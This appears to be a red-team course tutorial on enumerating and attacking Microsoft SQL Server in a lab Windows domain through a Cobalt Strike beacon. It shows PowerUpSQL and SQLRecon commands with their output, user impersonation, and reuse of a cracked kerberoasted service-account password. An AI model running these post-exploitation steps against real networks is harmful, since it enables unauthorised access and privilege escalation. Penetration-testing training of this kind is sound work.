Microsoft SQL Server is a relational database management system commonly found in Windows environments. They’re typically used to store information to support a myriad of business functions. In addition to the obvious data theft opportunities, they also have a large attack surface, allowing code execution, privilege escalation, lateral movement and persistence.

[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) and [SQLRecon](https://github.com/skahwah/SQLRecon) are excellent tools for enumerating and interacting with MS SQL Servers.

PowerUpSQL has a few cmdlets available for finding MS SQL Servers, including `Get-SQLInstanceDomain`, `Get-SQLInstanceBroadcast` and `Get-SQLInstanceScanUDP`.
```
beacon> powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
beacon> powershell Get-SQLInstanceDomain

ComputerName     : sql-2.dev.cyberbotic.io
Instance         : sql-2.dev.cyberbotic.io,1433
DomainAccountSid : 1500000521000672332383313895871914512914091400
DomainAccount    : mssql_svc
DomainAccountCn  : MS SQL Service

Description      :
```
  

`Get-SQLInstanceDomain` works by searching for SPNs that begin with _MSSQL*_.  This output shows that SQL-2 is running an instance of MS SQL server, under the context of the `mssql_svc` domain account.  You may also search the domain for groups that sound like they may have access to database instances (for example, a "SQL Admins" group).

`Get-SQLConnectionTest` can be used to test whether or not we can connect to the database.
```
beacon> powershell Get-SQLConnectionTest -Instance "sql-2.dev.cyberbotic.io,1433" | fl

ComputerName : sql-2.dev.cyberbotic.io
Instance     : sql-2.dev.cyberbotic.io,1433
Status       : Accessible
```
  

Then use `Get-SQLServerInfo` to gather more information about the instance.
```
beacon> powershell Get-SQLServerInfo -Instance "sql-2.dev.cyberbotic.io,1433"

ComputerName           : sql-2.dev.cyberbotic.io
Instance               : SQL-2
DomainName             : DEV
ServiceProcessID       : 2668
ServiceName            : MSSQLSERVER
ServiceAccount         : DEV\mssql_svc
AuthenticationMode     : Windows Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 15.0.2000.5
SQLServerMajorVersion  : 2019
SQLServerEdition       : Standard Edition (64-bit)
SQLServerServicePack   : RTM
OSArchitecture         : X64
OsVersionNumber        : SQL
Currentlogin           : DEV\bfarmer
IsSysadmin             : No
ActiveSessions         : 1
```
  

  If there are multiple SQL Servers available, you can chain these commands together to automate the data collection.  
  
```
beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
  

This output shows that whilst the database is accessible, our current user, bfarmer, is not a sysadmin.  SQLRecon has a nice module which can show us what roles we do have.
```
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe -a windows -s sql-2.dev.cyberbotic.io,1433 -m whoami

[+] Logged in as: 
DEV\bfarmer

[+] Mapped to the user:

[+] Roles:

User is NOT a member of db_owner role
User is NOT a member of db_accessadmin role
User is NOT a member of db_securityadmin role
User is NOT a member of db_ddladmin role
User is NOT a member of db_backupoperator role

```
  

On default installations, standard users do not have this "public" role by default and must be explicitly granted through [SQL Server Manager Studio](https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms) (SSMS).  The aforementioned information on a SQL instance cannot be enumerated if the user's security context does not have a valid role.

Finding a user (or group) that does have access can be challenging, because without the ability to query the SQL instance to ask it, you can be stuck guessing.  One port of call is to look for appropriately names domain groups and their members.
```
beacon> powershell Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }

GroupName     MemberName
---------     ----------
MS SQL Admins jking
```
  

"MS SQL Admins" clearly implies that jking may be a sysadmin.  Impersonating the user confirms the hypothesis.
```
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe -a windows -s sql-2.dev.cyberbotic.io,1433 -m whoami

[+] Logged in as: 
DEV\jking

[+] Mapped to the user: 
dbo

[+] Roles: 
User is a member of public role
User is a member of sysadmin role
User is a member of setupadmin role
User is a member of serveradmin role
User is a member of securityadmin role
User is a member of processadmin role
User is a member of diskadmin role
User is a member of dbcreator role
User is a member of bulkadmin role
```
  

Another option is to go after the MS SQL service account itself as this is also often given sysadmin privileges.  This assumption is the basis of BloodHound's SQLAdmin attack path.  We know that the domain account being used to run the service is `DEV\mssql_svc` and that the account is kerberoastable owing to its SPN.

If we can crack its plaintext password, we can use it to gain access to the SQL instance.
```
beacon> make_token DEV\mssql_svc Cyberb0tic
[+] Impersonated DEV\bfarmer

beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe -a windows -s sql-2.dev.cyberbotic.io,1433 -m whoami

[+] Logged in as: 
DEV\mssql_svc

[+] Mapped to the user:

[+] Roles:

User is a member of securityadmin role
User is a member of processadmin role
User is a member of diskadmin role
User is a member of dbcreator role
User is a member of bulkadmin role
```
  

Once we have access, there are several options for issuing queries against a SQL instance.  `Get-SQLQuery` from PowerUpSQL:
```
beacon> powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select @@servername"

Column1
-------
SQL-2

  

SQLRecon:

beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe -a windows -s sql-2.dev.cyberbotic.io,1433 -m query -o "select @@servername"

[+] Executing: select @@servername on sql-2.dev.cyberbotic.io,1433:

column0 | 
----------
SQL-2 |
```
